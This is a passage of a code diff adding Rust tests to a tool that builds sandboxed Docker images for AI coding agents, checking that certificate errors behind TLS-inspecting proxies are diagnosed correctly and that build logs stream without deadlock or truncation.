+            !body.contains("pub path:") && !body.contains("pub pem:"),
+            "the fields stay private, or the pem and the path can be swapped \
+             for ones nothing validated"
+        );
+    }
+
+    /// **The failure doctor's guest-side checks cannot reach.** Behind a
+    /// TLS-inspecting proxy there is no image to inspect — the build dies on
+    /// an unknown issuer, so every check that runs *inside* the sandbox is
+    /// unreachable and the user is left with `failed to build omh/base:…` and
+    /// a docker log they did not read. Doctor asks host-side too, since
+    /// `3971fc6`; this is the half that fires when a build actually runs.
+    ///
+    /// The needles are the control arm of the measurement in `ca_layer`'s doc,
+    /// verbatim: each is what that tool actually printed against a leaf signed
+    /// by a private root with no root installed. A needle omh invented would
+    /// be a guess presented as a diagnosis.
+    #[test]
+    fn a_build_that_died_on_an_unknown_issuer_names_the_setting() {
+        // Measured, one per toolchain, in the control image.
+        for (tool, said) in [
+            ("curl", "curl: (60) SSL certificate problem: unable to get local issuer certificate"),
+            ("node", "Error: unable to verify the first certificate ... UNABLE_TO_VERIFY_LEAF_SIGNATURE"),
+            ("python", "ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed"),
+            ("pip", "Could not fetch URL https://pypi.org/simple/: CERTIFICATE_VERIFY_FAILED"),
+            ("go", "tls: failed to verify certificate: x509: certificate signed by unknown authority"),
+            ("cargo", "error: the SSL certificate is invalid; class=Ssl (16)"),
+            ("git", "fatal: unable to access: server certificate verification failed"),
+        ] {
+            let said = why_the_build_failed(said, false)
+                .unwrap_or_else(|| panic!("{tool}'s failure was not recognised"));
+            assert!(
+                said.contains("ca_cert"),
+                "{tool}: the diagnosis must name the setting that fixes it: {said}"
+            );
+            assert!(
+                said.contains("omh set --local"),
+                "{tool}: and the spelling that works — `omh settings set` writes \
+                 a template nothing re-reads: {said}"
+            );
+        }
+
+        // **A certificate already set is a different problem.** Telling
+        // somebody to set `ca_cert` when they have is how a diagnosis becomes
+        // noise; the likely cause is a chain missing its intermediate.
+        let already = why_the_build_failed("x509: certificate signed by unknown authority", true)
+            .expect("still recognised");
+        assert!(
+            !already.contains("omh set --local"),
+            "do not tell somebody to set what they have already set: {already}"
+        );
+        assert!(
+            already.contains("chain") || already.contains("doctor"),
+            "it must say what to check instead: {already}"
+        );
+
+        // **Silence is the default.** An ordinary build failure must not be
+        // dressed up as a proxy problem — the setting would be a red herring
+        // and the real error is in the log.
+        for ordinary in [
+            "ERROR: failed to solve: process \"/bin/sh -c apt-get install -y nosuchpkg\" did not complete successfully: exit code: 100",
+            "no space left on device",
+            "",
+        ] {
+            assert_eq!(
+                why_the_build_failed(ordinary, false),
+                None,
+                "an ordinary failure must not be diagnosed as a proxy: {ordinary}"
+            );
+        }
+    }
+
+    /// **The tee must not deadlock, and only a real build can say so.**
+    ///
+    /// omh sends the recipe on `-f -`, so docker reads stdin until EOF.
+    /// `Child::wait` closes stdin for you — but reading stderr happens
+    /// *before* the wait, so a version of `build` that leaves stdin open hangs
+    /// forever against a docker that is still waiting for the end of its
+    /// recipe. No unit test sees that: it is a property of two real pipes.
+    ///
+    /// Also asserts the diagnosis reaches the error, using a recipe that fails
+    /// while printing what a proxy prints. That is a real non-zero build, not
+    /// a string handed to `why_the_build_failed`.
+    ///
+    /// `#[ignore]` because it needs a container runtime. `./scripts/check.sh
+    /// --all` runs it.
+    #[test]
+    #[ignore]
+    fn a_real_build_streams_its_log_and_diagnoses_a_proxy() {
+        let docker = "docker";
+        // A build that succeeds: proves the tee does not deadlock.
+        let ok = build(
+            docker,
+            "omh-test/tee-ok:1",
+            "FROM alpine:3\nRUN echo built-fine\n",
+            &Kind::Base,
+            None,
+        );
+        assert!(ok.is_ok(), "a trivial build must succeed: {ok:?}");
+
+        // A build that fails the way a TLS-inspecting proxy makes it fail.
+        let said = build(
+            docker,
+            "omh-test/tee-fail:1",
+            "FROM alpine:3\nRUN echo 'x509: certificate signed by unknown authority' >&2 && exit 1\n",
+            &Kind::Base,
+            None,
+        )
+        .expect_err("that recipe must fail");
+        let said = format!("{said:#}");
+        assert!(
+            said.contains("ca_cert"),
+            "a build that died on an unknown issuer must name the setting: {said}"
+        );
+        assert!(
+            said.contains("omh set --local"),
+            "and the spelling that works: {said}"
+        );
+
+        // **A harness layer, with a certificate already set.** This is the
+        // case the derivation got wrong: only the *base* recipe carries
+        // `update-ca-certificates`, so sniffing the recipe text called every
+        // harness and stack build "no certificate" — and the harness layer is
+        // the `npm install -g` that a chain missing its intermediate actually
+        // breaks. Telling that user to set `ca_cert` is the noise the second
+        // message exists to prevent. The unit test above cannot see it,
+        // because it hands the flag in by hand.
+        let pem = "-----BEGIN CERTIFICATE-----\nQUJD\n-----END CERTIFICATE-----\n";
+        let adapter = claude();
+        let already = build(
+            docker,
+            "omh-test/tee-harness:1",
+            // Harness-shaped: `FROM`, a `RUN`, and no `ca_layer` anywhere.
+            "FROM alpine:3\nRUN echo 'UNABLE_TO_VERIFY_LEAF_SIGNATURE' >&2 && exit 1\n",
+            &Kind::Harness(&adapter),
+            Some(pem),
+        )
+        .expect_err("that recipe must fail");
+        let already = format!("{already:#}");
+        assert!(
+            !already.contains("omh set --local"),
+            "the certificate is set; do not tell them to set it: {already}"
+        );
+        assert!(
+            already.contains("chain") || already.contains("doctor"),
+            "it must say what to check instead: {already}"
+        );
+
+        // And an ordinary failure stays ordinary.
+        let plain = build(
+            docker,
+            "omh-test/tee-plain:1",
+            "FROM alpine:3\nRUN exit 1\n",
+            &Kind::Base,
+            None,
+        )
+        .expect_err("that recipe must fail");
+        assert!(
+            !format!("{plain:#}").contains("ca_cert"),
+            "an ordinary failure must not be dressed up as a proxy problem"
+        );
+    }
+
+    /// **One byte that is not UTF-8 must not end the build log.**
+    ///
+    /// `read_line` answers `InvalidData` for such a byte, and the first
+    /// version folded that into "the stream ended" with `unwrap_or(0)`. Three
+    /// things followed, all silent: the relay stopped, so a multi-minute build
+    /// went quiet where `Stdio::inherit` had shown everything; the captured log
+    /// was truncated, so a certificate error after that byte was never
+    /// diagnosed; and nothing drained a pipe the child was still filling.
+    ///
+    /// Driven through a real child process rather than a `Cursor`, because the
+    /// thing under test is a pipe. **Not** through docker: BuildKit re-encodes
+    /// what a `RUN` step writes, so a recipe emitting `\377` arrives as valid
+    /// UTF-8 and passes either way — a test that cannot fail.
+    #[test]
+    fn a_byte_that_is_not_utf8_does_not_truncate_the_log() {
+        let mut child = std::process::Command::new("sh")
+            .arg("-c")
+            .arg("printf 'step 1/3\\n' >&2; printf '\\377\\n' >&2; printf 'x509: certificate signed by unknown authority\\n' >&2")
+            .stderr(std::process::Stdio::piped())
+            .spawn()
+            .expect("sh");
+        let log = relay(child.stderr.take().expect("piped"));
+        let _ = child.wait();
+
+        assert!(
+            log.contains("step 1/3"),
+            "the lines before the bad byte are kept: {log:?}"
+        );
+        assert!(
+            log.contains("x509: certificate signed by unknown authority"),
+            "and so is everything after it — this is the assertion that was red \
+             before `read_until`: {log:?}"
+        );
+        assert!(
+            why_the_build_failed(&log, false).is_some(),
+            "so the diagnosis still fires on a log with an ugly byte in it"
         );
     }
 
@@ -1680,7 +3197,7 @@ mod tests {
     /// build, a tag and a pull for no content.
     #[test]
     fn nothing_to_install_is_the_harness_image_itself() {
-        assert_eq!(stack_tag(&claude(), &[]), tag_for(&claude()));
+        assert_eq!(stack_tag(&claude(), &[], None), tag_for(&claude(), None));
     }
 
     /// File order is install order, and it is load-bearing: `corepack enable
@@ -1696,6 +3213,7 @@ mod tests {
         let df = stack_dockerfile(
             &claude(),
             &["zzz corepack enable pnpm", "aaa apt-get install nodejs"],
+            None,
         );
         let at = |needle: &str| df.find(needle).unwrap_or_else(|| panic!("missing: {df}"));
         assert!(
@@ -1708,14 +3226,18 @@ mod tests {
     #[test]
     fn a_changed_recipe_is_a_different_tag() {
         let mut a = claude();
-        let before = tag_for(&a);
+        let before = tag_for(&a, None);
         a.install = "npm install -g @anthropic-ai/claude-code@next".into();
-        assert_ne!(tag_for(&a), before, "a changed recipe must force a rebuild");
+        assert_ne!(
+            tag_for(&a, None),
+            before,
+            "a changed recipe must force a rebuild"
+        );
     }
 
     #[test]
     fn an_unchanged_recipe_keeps_its_tag() {
-        assert_eq!(tag_for(&claude()), tag_for(&claude()));
+        assert_eq!(tag_for(&claude(), None), tag_for(&claude(), None));
     }
 
     /// The four things `sbx` requires of a kit base image. Getting these wrong
@@ -1723,7 +3245,7 @@ mod tests {
     /// backend — the exact split this project exists to avoid.
     #[test]
     fn the_base_satisfies_the_sandbox_contract() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         assert!(
             df.contains("-u 1000") || df.contains("1000"),
             "UID 1000: {df}"
@@ -1742,7 +3264,7 @@ mod tests {
     /// one.
     #[test]
     fn the_image_creates_the_home_the_code_mounts_into() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         assert!(
             df.contains(&format!("usermod -l agent -d {GUEST_HOME}")),
             "the image must create the home the launcher mounts into:\n{df}"
@@ -1763,7 +3285,7 @@ mod tests {
             "graph cache {GRAPH_CACHE} is not under {GUEST_HOME}"
         );
         assert!(
-            base_dockerfile().contains(GRAPH_CACHE),
+            base_dockerfile(None).contains(GRAPH_CACHE),
             "the image must create the cache directory, or docker makes it root-owned"
         );
     }
@@ -1854,7 +3376,7 @@ mod tests {
     /// the mount without preparing its new home cannot stay green.
     #[test]
     fn the_image_creates_the_note_store_the_launcher_mounts_into() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         let notes = crate::memory::GUEST_LOCAL_NOTES;
         assert!(
             df.contains(notes),
@@ -1906,7 +3428,7 @@ mod tests {
     /// without it the persistence wrapper fails at launch, not at build.
     #[test]
     fn the_base_provides_what_every_session_needs() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         for tool in ["git", "dtach", "ripgrep"] {
             assert!(df.contains(tool), "missing {tool}: {df}");
         }
@@ -1917,7 +3439,7 @@ mod tests {
     /// the thing that makes omh more than a launcher.
     #[test]
     fn the_base_image_carries_the_base_set() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         assert!(df.contains(crate::base::GRAPH_BIN), "no code graph: {df}");
     }
 
@@ -1925,13 +3447,13 @@ mod tests {
     /// be owned by the agent, or docker creates it as root.
     #[test]
     fn the_base_owns_the_graph_cache_directory() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         assert!(df.contains(crate::base::GRAPH_CACHE), "got: {df}");
     }
 
     #[test]
     fn the_base_can_serve_ssh() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         assert!(df.contains("openssh-server"), "got: {df}");
         assert!(df.contains("omh-session"), "needs a session entrypoint");
     }
@@ -1941,7 +3463,7 @@ mod tests {
     /// read one it does not trust.
     #[test]
     fn the_session_entrypoint_installs_the_key_with_permissions_sshd_accepts() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         assert!(
             df.contains("OMH_PUBKEY"),
             "key must come from the environment"
@@ -1952,14 +3474,14 @@ mod tests {
 
     #[test]
     fn the_session_entrypoint_outlives_the_command_that_started_it() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         assert!(df.contains("sshd"), "must start sshd");
         assert!(df.contains("sleep infinity"), "PID 1 must not exit");
     }
 
     #[test]
     fn the_base_creates_the_paths_the_launcher_mounts_into() {
-        let df = base_dockerfile();
+        let df = base_dockerfile(None);
         for dir in ["/work", "/omh/sock", "/omh/cache"] {
             assert!(df.contains(dir), "missing {dir}: {df}");
         }
@@ -1967,8 +3489,11 @@ mod tests {
 
     #[test]
     fn the_harness_layer_extends_the_base_and_installs_the_harness() {
-        let df = harness_dockerfile(&claude());
-        assert!(df.contains(&format!("FROM {}", base_tag())), "got: {df}");
+        let df = harness_dockerfile(&claude(), None);
+        assert!(
+            df.contains(&format!("FROM {}", base_tag(None))),
+            "got: {df}"
+        );
         assert!(
             df.contains("@anthropic-ai/claude-code"),
             "install command: {df}"
@@ -1987,7 +3512,7 @@ mod tests {
     /// them up front with the right owner.
     #[test]
     fn the_harness_layer_owns_the_directories_it_mounts_into() {
-        let df = harness_dockerfile(&claude());
+        let df = harness_dockerfile(&claude(), None);
         assert!(df.contains("/home/agent/.claude"), "config dir: {df}");
         assert!(
             df.contains("chown"),
@@ -2066,9 +3591,9 @@ mod tests {
         // is the newest way to end an image privileged — and an image that ends
         // privileged hands the agent the sandbox's own escape hatch.
         for df in [
-            base_dockerfile(),
-            harness_dockerfile(&claude()),
-            stack_dockerfile(&claude(), &["apt-get install -y gcc"]),
+            base_dockerfile(None),
+            harness_dockerfile(&claude(), None),
+            stack_dockerfile(&claude(), &["apt-get install -y gcc"], None),
         ] {
             let last_user = df
                 .lines()
@@ -2092,7 +3617,7 @@ mod tests {
     /// `contains` and change nothing.
     #[test]
     fn the_stack_layer_installs_as_root() {
-        let df = stack_dockerfile(&claude(), &["apt-get install -y gcc"]);
+        let df = stack_dockerfile(&claude(), &["apt-get install -y gcc"], None);
         let line = |needle: &str| {
             df.lines()
                 .position(|l| l.trim_start().starts_with(needle))
